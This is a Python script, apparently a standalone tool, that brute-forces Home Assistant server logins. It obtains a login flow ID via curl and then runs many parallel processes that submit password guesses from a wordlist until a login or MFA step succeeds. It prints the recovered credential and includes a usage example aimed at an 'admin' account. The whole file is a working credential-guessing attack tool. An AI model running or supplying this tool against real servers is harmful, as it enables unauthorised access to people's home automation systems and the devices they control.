"""
    Author: Long Nguyen
    Description: This program allows brute-forcing credentials for HomeAssistant server by repeatedly running curl POST login requests.
    References:
        (1) Read output from shell command: https://stackoverflow.com/questions/4760215/running-shell-command-and-capturing-the-output
        (2) Read a file line by line: https://www.geeksforgeeks.org/read-a-file-line-by-line-in-python/
        (3) https://stackoverflow.com/questions/29810041/python-weird-behavior-with-multiprocessing-join-does-not-execute
        (4) https://docs.python.org/3/library/multiprocessing.html#multiprocessing.Queue.cancel_join_thread
"""

import subprocess
import json
import multiprocessing
import sys
import time

"""
    The curl command below is for getting the flow_id for logining in. Each login session is associated with a flow_id.
        curl -d '{"client_id":"http://192.168.1.142:8123/","handler":["homeassistant",null],"redirect_uri":"http://192.168.1.142:8123/lovelace/0?auth_callback=1"}' -H 'Content-Type: text/plain;charset=UTF-8' 192.168.1.142:8123/auth/login_flow/
    This method runs the above curl command and return the flow_id
"""
def get_flow_id(host):
    data = "{\"client_id\":\"http://192.168.1.142:8123/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://192.168.1.142:8123/lovelace/0?auth_callback=1\"}"

    headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"

    #host = "192.168.1.142:8123/auth/login_flow"
    host = host + "/auth/login_flow"
    result = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
    flow_id = ""
    try:
        json_object = json.loads(result.stdout.decode())

        # Make sure we are dealing with homeassistant server and not with other server who might use the same JSON format.
        # This take care of when a user enters a non-HomeAssistant server that also uses flow_id to login.
        handler = json_object.get("handler")
        if handler == ["homeassistant", None]:
            flow_id = json_object.get("flow_id")
    except json.decoder.JSONDecodeError:
        print("Error: Fail to get flow_id from", host)
    return flow_id


"""
    After getting the flow_id, we can now login with this curl command:
        curl -d '{"username":"long","password":"long","client_id":"http://192.168.1.142:8123/"}' -H 'Content-Type: text/plain;charset=UTF-8' 192.168.1.142:8123/auth/login_flow/[flow_id]
    This method runs the above curl command repeatedly with different credential each time until it finds a valid credential.
"""
def bruceforce(flow_id, host, username, passwords_queue, credential_found, queue_ended):
    host = host + "/auth/login_flow/" + flow_id
    username = "\""+ username +"\""
    while True:
        if passwords_queue:
            queue_elem = passwords_queue.get()
            password = "\"" + queue_elem[1] + "\""

            count = queue_elem[0]
            data = "{\"username\":" + username + ",\"password\":" + password + ",\"client_id\":\"http://192.168.1.142:8123/\"}"
            # headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
            #host = "192.168.1.142:8123/auth/login_flow/" + flow_id
            print("Attempt", count, ": username", username, "password", password)
            curl_output = subprocess.run(["curl", "-d", data, host, "-s"], stdout=subprocess.PIPE)
            response = curl_output.stdout.decode()
            if "\"type\": \"create_entry\"" in response or "\"step_id\": \"mfa\"" in response:
                print("-------------------------------------------------------------------------------")
                print("Successfully authenticated! username:", username, "password:", password, "@ Attempt", count)
                print("-------------------------------------------------------------------------------")
                credential_found.value = 42  # any number will make bool(credential_found.value) True
                break
            elif bool(queue_ended.value):
                print("-------------------------")
                print("No valid credential found")
                print("-------------------------")
                break
        if bool(credential_found.value):
            break
    # Please see reference (4)
    passwords_queue.cancel_join_thread()  # this allow the process to exit even when the multiprocessing.Queue is not empty.


# This method load the passwords from a password text file, and load them in a queue that is shared among all processes.
def prepare_passwords_queue(password, passwords_queue, credential_found, queue_ended):
    count = 0
    if password[0] == "text":
        passwords_queue.put((1, password[1]))
    else:
        password = open(password[1], 'r')
        while True:
            if passwords_queue.qsize() < 1000:  # We don't want to abuse our memory, especially if the password file is very large.
                count += 1
                # Get next line from file
                line = password.readline()

                # if line is empty
                # end of file is reached
                if not line:
                    break
                passwords_queue.put((count, line.strip()))
            if bool(credential_found.value):
                break
        # Closing files
        password.close()

    queue_ended.value = 42 # signal that the password queue ended
    # Please see reference (4)
    passwords_queue.cancel_join_thread()  # this allow the process to exit even when the multiprocessing.Queue is not empty.

def process_arguments():
    username = ""
    password = ("text", "password")
    host = ""
    num_of_bruceforces = 20
    args = sys.argv

    for i in range(1, len(args)):
        if args[i] == "-s":
            host = args[i + 1]
        elif args[i] == "-u":
            username = args[i + 1]
        elif args[i] == "-p":
            password = ("text", args[i + 1])
        elif args[i] == "-P":
            password = ("file", args[i + 1])
        elif args[i] == "-b":
            num_of_bruceforces = int(args[i + 1])

    if len(args) == 1:
        print("Options:")
        print("\t-s: Specify the server's address with port number.")
        print("\t    If port is not provided, the port will be selected appropriately according to the protocol (i.e. HTTP vs HTTPS).")
        print("\t-u: Specify the username.")
        print("\t-p: Specify the password.")
        print("\t-P: Specify the list of password.")
        print("\t-b: Specify the number of concurrent bruteforce processes. The default is 20.")
        print("\t    Lower the number if HomeAssistant server is running on a low-end machine.")
        print("\nExample: python ha_bruteforce.py -s 192.168.1.1:8080 -u admin -P passwords.txt")
        return None

    return host, username, password, num_of_bruceforces

def main():
    passwords_queue = multiprocessing.Queue()  # This queue contains the passwords we want to use for bruce-force
    queue_ended = multiprocessing.Value('i', False)  # Whether or not all provided passwords are tried.
    credential_found = multiprocessing.Value('i', False)  # Whether or not a valid credential is found.
    bruteforce_processes = []  # Keep track of bruceforce processes.

    # Get the program arguments
    arguments = process_arguments()

    if arguments == None:
        exit()

    # Getting values from arguments
    host, username, password, num_of_bruteforces = arguments
    if password[0] == "text":
        num_of_bruteforces = 1

    flow_id = get_flow_id(host)  # Each login session has its own unique flow_id.
    # Multiple clients can authenticate via one single session at the same time.
    # I ran a few test and it seems that making multiple processes bruce-force via one session
    # is slightly faster than bruce-forcing via multiple sessions
    # (i.e. each bruteforce process has its own flow_id is somewhat slower)

    if flow_id == "":
        exit()

    # Running the bruce-force
    print("Running", num_of_bruteforces, "bruteforce processes in parallel")
    start_time = time.time()

    # Prepare the passwords_queue
    multiprocessing.Process(target=prepare_passwords_queue,
                            args=(password, passwords_queue, credential_found, queue_ended)).start()
    # Initialize the bruce-force processes
    for i in range(num_of_bruteforces):
        p = multiprocessing.Process(target=bruceforce,
                                    args=(flow_id, host, username, passwords_queue, credential_found, queue_ended))
        p.start()
        bruteforce_processes.append(p)

    # The main() process wait for other processes to stop before proceed to next step.
    for p in bruteforce_processes:
        p.join()

    end_time = time.time()
    print("Time taken: ", end_time - start_time, "secs")

if __name__ == "__main__":
    main()